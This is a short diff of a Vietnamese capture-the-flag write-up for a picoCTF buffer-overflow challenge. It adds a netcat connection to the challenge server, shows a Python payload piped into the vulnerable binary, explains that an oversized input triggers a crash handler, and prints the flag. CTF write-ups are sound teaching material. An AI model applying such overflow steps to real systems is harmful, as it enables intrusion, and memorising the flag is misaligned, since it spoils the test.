@@ -60,8 +60,9 @@ sys.stdout.buffer.write(payload)
 
 ### Cách chạy:
 ```bash
+nc saturn.picoctf.net 62294
 python3 measure.py | ./vuln
 ```
-**Kết quả**: Khi input đủ lớn (vượt quá giới hạn stack frame của vuln), chương trình bị Crash, kích hoạt signal handler và in ra flag:
+**Kết quả**: Khi input đủ lớn (vượt quá giới hạn stack frame của vuln), chương trình bị Crash, kích hoạt signal handler và in ra `flag`:
 
 `picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`
